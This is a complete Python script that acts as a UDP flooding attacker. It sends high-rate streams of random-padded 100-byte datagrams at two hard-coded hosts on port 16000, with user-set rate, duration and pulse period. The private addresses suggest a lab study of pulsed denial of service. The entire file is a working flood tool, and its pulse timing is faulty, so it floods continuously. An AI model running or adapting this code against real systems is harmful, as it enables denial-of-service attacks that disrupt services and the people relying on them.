# coding=utf-8
from math import ceil
from random import randint
from socket import *
from time import time, sleep
from threading import Thread


class UDP:
    'UDP连接（攻击者）'

    def __init__(self, des_host, des_port, rate, last, T, t):
        # 初始化地址（主机+端口号），攻击强度(Mbit/s=1024*1024bit/s),持续时间，周期
        self.des_host = des_host
        self.des_port = des_port
        self.rate = rate
        self.last = last
        self.T = T
        self.t = t

    def get_random_data(self):
        # UTF-8中，一个英文字母占用1字节
        string = 'QAZXSWEDCVFRTGBNHYUJMKIOLPqwertyuiopasdfghjklzxcvbnm1234567890`-=[];,./'
        data = string[0:randint(1, len(string) - 1)]
        return data

    def create_udp_link(self):
        # 创建socket对象,SOCK_DGRAM为数据报/UDP套接字
        print('attack start')
        udp_attacker = socket(AF_INET, SOCK_DGRAM)
        # 绑定地址
        # udp_attacker.bind((self.src_host, self.src_port))
        # 设定UDP包大小为100字节=100*8bit，其中头部占8字节=8*8bit,计算所需发送包数量
        bag_num = int(ceil(self.rate * 1024 * 1024 / (100 * 8)))
        now_time = start_time = time()
        while time() - start_time <= self.last:
            if time() - now_time <= self.T:
                now_time = time()
                if time() - now_time <= self.t:
                    for i in range(bag_num):
                        # 处理阶段,向地址（host,port）发起攻击
                        string = self.get_random_data()
                        data = string + '+' * (100 - 8 - len(string))
                        udp_attacker.sendto(data.encode(), (self.des_host, self.des_port))
        # 连接结束，关闭套接字
        print('attack finish')
        udp_attacker.close()


rate = input('rate:')
last = input('last:')
T = input('T:')
t = input('t:')
a1 = UDP('10.0.0.7', 16000, int(rate), int(last), int(T), float(t))
a1.create_udp_link()
a2 = UDP('10.0.0.8', 16000, int(rate), int(last), int(T), float(t))
a2.create_udp_link()
